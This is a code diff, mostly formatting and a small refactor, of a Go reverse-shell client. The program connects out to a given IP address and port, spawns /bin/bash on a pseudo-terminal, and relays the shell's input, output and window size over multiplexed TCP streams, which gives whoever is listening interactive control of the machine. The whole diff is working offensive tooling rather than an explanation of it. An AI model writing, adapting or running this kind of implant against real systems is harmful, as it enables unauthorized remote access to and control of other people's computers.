@@ -2,30 +2,30 @@ package main
 
 import (
 	"encoding/gob"
-	"io"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"os"
 	"os/exec"
 	"strings"
 
-	"github.com/jessevdk/go-flags"
 	"github.com/creack/pty"
 	"github.com/hashicorp/yamux"
+	"github.com/jessevdk/go-flags"
 )
 
 type options struct {
 	IpAddress string `short:"i" long:"ipAddress" description:"IP address to connect to" required:"true"`
-	Port int `short:"p" long:"port" description:"Port to connect to" default:"1337"`
-	Cmd string `short:"c" long:"cmd" description:"Exec command and redirect IO to connection" default:"/bin/bash"`
+	Port      int    `short:"p" long:"port" description:"Port to connect to" default:"1337"`
+	Cmd       string `short:"c" long:"cmd" description:"Exec command and redirect IO to connection" default:"/bin/bash"`
 }
 
 func main() {
 	// parse command line args
 	opts := parseArgs()
 
-	// start cmd exec on a pty shell 
+	// start cmd exec on a pty shell
 	ptmx := startPtyShell(opts.Cmd)
 	defer ptmx.Close()
 
@@ -47,8 +47,6 @@ func startPtyShell(cmdString string) (*os.File) {
 	ptmx, err := pty.Start(cmd)
 	fatalIfErr("Start PTY", err)
 
-	//go func() { err := cmd.Wait(); fatalIfErr("Wait", err) }()
-
 	// return pty file
 	return ptmx
 }
@@ -59,10 +57,10 @@ func dialTcpShell(ipAddress string, port int, ptmx *os.File) {
 	addressPort := fmt.Sprintf("%s:%d", ipAddress, port)
 	conn, err := net.Dial("tcp", addressPort)
 	fatalIfErr("Dial", err)
-	
+
 	// handle connection
 	fmt.Printf("[*] Connected to %s\n", conn.RemoteAddr().String())
-	// handleSimpleConnection(conn, ptmx)
+	//handleSimpleConnection(conn, ptmx)
 	handleMuxConnection(conn, ptmx)
 }
 
@@ -71,8 +69,8 @@ func handleSimpleConnection(conn net.Conn, ptmx *os.File) {
 
 	// redirect IO to socket
 	done := make(chan struct{})
-	go func(){ io.Copy(conn, ptmx); done<-struct{}{} }()
-	go func(){ io.Copy(ptmx, conn); done<-struct{}{} }()
+	go func() { io.Copy(conn, ptmx); done <- struct{}{} }()
+	go func() { io.Copy(ptmx, conn); done <- struct{}{} }()
 	<-done
 }
 
@@ -81,51 +79,53 @@ func handleMuxConnection(conn net.Conn, ptmx *os.File) {
 	session, err := yamux.Client(conn, nil)
 	fatalIfErr("Session", err)
 	defer session.Close() // closes all streams and conn
-	
+
 	// any message pushed to done will be used to return later
 	done := make(chan struct{})
+	defer func() { <-done }()
 
 	// stream for shell IO
 	ioStream, err := session.Open()
-	fatalIfErr("Stream IO", err)
-	go func(){ io.Copy(ptmx, ioStream); done<-struct{}{} }() // read stdin from socket
-	go func(){ io.Copy(ioStream, ptmx); done<-struct{}{} }() // write stdout to socket
-	
+	fatalIfErr("Stream io", err)
+	go streamShellIO(ioStream, ptmx, done)
+
 	// stream for resizing window
 	resizeStream, err := session.Open()
 	fatalIfErr("Stream resize", err)
-	go streamResize(resizeStream, ptmx);
+	go streamResize(resizeStream, ptmx)
+}
 
-	// wait for any message to return
-	<-done
+func streamShellIO(stream net.Conn, ptmx *os.File, done chan struct{}) {
+	go func() { io.Copy(ptmx, stream); done <- struct{}{} }() // read stdin from socket
+	go func() { io.Copy(stream, ptmx); done <- struct{}{} }() // write stdout to socket
 }
 
 func streamResize(stream net.Conn, ptmx *os.File) {
 	decoder := gob.NewDecoder(stream)
 	for {
 		// get new size
-		var size struct{Width, Height int}
+		var size struct{ Width, Height int }
 		err := decoder.Decode(&size)
-		if err != nil {
+		if err != nil && err != io.EOF {
 			// skip setting size
 			logErr("Get size", err)
 			continue
 		}
 
 		// set size
-		ws := &pty.Winsize{ Cols: uint16(size.Width), Rows: uint16(size.Height) }
+		ws := &pty.Winsize{Cols: uint16(size.Width), Rows: uint16(size.Height)}
 		err = pty.Setsize(ptmx, ws)
 		logIfErr("Set size", err)
 	}
 }
 
-func parseArgs() (*options) {
+func parseArgs() *options {
 	var opts options
 	if _, err := flags.Parse(&opts); err != nil {
-		/* 
-		passing help flag in args prints help and also throws ErrHelp
-		if error type is ErrHelp, omit second print and exit cleanly
-		everything else log and exit with error
+		/*
+			passing help flag in args prints help and also throws ErrHelp
+			if error type is ErrHelp, omit second print and exit cleanly
+			everything else log and exit with error
 		*/
 		switch flagsErrPtr := err.(type) {
 		case *flags.Error:
